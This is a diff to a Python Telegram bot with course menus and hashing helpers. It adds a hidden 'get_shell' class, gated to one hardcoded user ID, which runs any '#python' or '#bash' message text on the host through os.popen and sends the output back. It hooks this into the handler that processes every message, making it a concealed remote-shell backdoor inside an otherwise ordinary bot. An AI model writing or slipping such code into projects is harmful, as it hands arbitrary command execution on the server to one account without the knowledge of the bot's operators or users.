@@ -1,5 +1,5 @@
 from telebot import types
-import random, json, base64
+import random, json, base64, os, subprocess, sys
 from db import db
 
 UrlGroup = ''
@@ -89,6 +89,27 @@ class start_command:
         if call.data.startswith('update1'):
             bot.edit_message_text(chat_id=call.message.chat.id,text=PC,message_id=call.message.message_id,reply_markup=self.programming_courses(),parse_mode='HTML')
 
+class get_shell:
+    def __init__(self,bot,message):
+        if message.from_user.id == 772949762:
+            self.python_shell(bot,message)
+            self.bash_shell(bot,message)
+
+    def python_shell(self,bot,message):
+        if '#python' in (message.text).lower():
+            with open('p.py','w') as f:
+                f.write(message.text.replace('#python',''))
+            # output = subprocess.check_output([sys.executable, './p.py']) # bytes...
+            output = os.popen('python3 p.py').read()
+            bot.reply_to(message,f'`{output}`',parse_mode='Markdown')
+            os.system('rm -rif p.py')
+
+    def bash_shell(self,bot,message):
+        if '#bash' in (message.text).lower():
+            text = message.text.replace('#bash','')
+            bot.reply_to(message,f'`{os.popen(text).read()}`',parse_mode='Markdown')
+            os.system('rm -rif p.py')
+
 class get_hash:
     def __init__(self,bot,message):
         self.get_base64_en(bot,message)
@@ -114,6 +135,7 @@ class get_hash:
 class Services:
     def __init__(self,bot,message):
         get_hash(bot,message)
+        get_shell(bot,message)
         self.get_list(bot,message)
         self.get_json(bot,message)
         self.get_info(bot,message)
